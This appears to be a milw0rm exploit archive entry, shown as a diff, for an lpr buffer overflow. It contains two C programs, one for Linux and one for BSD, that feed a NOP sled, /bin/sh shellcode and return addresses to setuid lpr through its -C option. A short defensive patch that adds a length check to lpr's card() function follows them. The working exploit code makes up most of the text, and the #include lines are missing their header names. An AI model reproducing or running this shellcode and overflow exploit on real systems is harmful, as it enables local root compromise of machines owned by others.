@@ -1,0 +1,119 @@
+-------------------------------------- linux_lpr_exploit.c ----------
+#include 
+#include 
+#include 
+
+#define DEFAULT_OFFSET          50
+#define BUFFER_SIZE             1023
+
+long get_esp(void)
+{
+   __asm__("movl %esp,%eax\n");
+}
+
+void main()
+{
+   char *buff = NULL;
+   unsigned long *addr_ptr = NULL;
+   char *ptr = NULL;
+
+   u_char execshell[] = "\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07"
+                        "\x89\x56\x0f\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12"
+                        "\x8d\x4e\x0b\x8b\xd1\xcd\x80\x33\xc0\x40\xcd\x80\xe8"
+                        "\xd7\xff\xff\xff/bin/sh";
+   int i;
+
+   buff = malloc(4096);
+   if(!buff)
+   {
+      printf("can't allocate memory\n");
+      exit(0);
+   }
+   ptr = buff;
+   memset(ptr, 0x90, BUFFER_SIZE-strlen(execshell));
+   ptr += BUFFER_SIZE-strlen(execshell);
+   for(i=0;i < strlen(execshell);i++)
+      *(ptr++) = execshell[i];
+   addr_ptr = (long *)ptr;
+   for(i=0;i<2;i++)
+      *(addr_ptr++) = get_esp() + DEFAULT_OFFSET;
+   ptr = (char *)addr_ptr;
+   *ptr = 0;
+   execl("/usr/bin/lpr", "lpr", "-C", buff, NULL);
+}
+------------------------------------------- bsd_lpr_exploit.c ------
+#include 
+#include 
+#include 
+
+#define DEFAULT_OFFSET          50
+#define BUFFER_SIZE             1023
+
+long get_esp(void)
+{
+   __asm__("movl %esp,%eax\n");
+}
+
+void main()
+{
+   char *buff = NULL;
+   unsigned long *addr_ptr = NULL;
+   char *ptr = NULL;
+
+   char execshell[] =
+   "\xeb\x23\x5e\x8d\x1e\x89\x5e\x0b\x31\xd2\x89\x56\x07\x89\x56\x0f"
+   "\x89\x56\x14\x88\x56\x19\x31\xc0\xb0\x3b\x8d\x4e\x0b\x89\xca\x52"
+   "\x51\x53\x50\xeb\x18\xe8\xd8\xff\xff\xff/bin/sh\x01\x01\x01\x01"
+   "\x02\x02\x02\x02\x03\x03\x03\x03\x9a\x04\x04\x04\x04\x07\x04";
+
+   int i;
+
+   buff = malloc(4096);
+   if(!buff)
+   {
+      printf("can't allocate memory\n");
+      exit(0);
+   }
+   ptr = buff;
+   memset(ptr, 0x90, BUFFER_SIZE-strlen(execshell));
+   ptr += BUFFER_SIZE-strlen(execshell);
+   for(i=0;i < strlen(execshell);i++)
+      *(ptr++) = execshell[i];
+   addr_ptr = (long *)ptr;
+   for(i=0;i<2;i++)
+      *(addr_ptr++) = get_esp() + DEFAULT_OFFSET;
+   ptr = (char *)addr_ptr;
+   *ptr = 0;
+   execl("/usr/bin/lpr", "lpr", "-C", buff, NULL);
+}
+--------------------------------------------------------------------------
+
+  Here is a little patch -- see file lpr.c, function card():
+("!!" marks added lines)
+
+--------------------------------------------------------------------------
+static void card(c, p2)
+        register int c;
+        register char *p2;
+{
+        char buf[BUFSIZ];
+        register char *p1 = buf;
+        register int len = 2;
+
+
+        if (strlen(p2) > BUFSIZ-2)                     /* !! */
+        {                                              /* !! */
+                printf("No, thanks...\n");             /* !! */
+                exit(1);                               /* !! */
+        }
+        *p1++ = c;
+        while ((c = *p2++) != '\0') {
+                *p1++ = (c == '\n') ? ' ' : c;
+                len++;
+        }
+        *p1++ = '\n';
+        write(tfd, buf, len);
+}
+
+
+// milw0rm.com [1996-10-25]
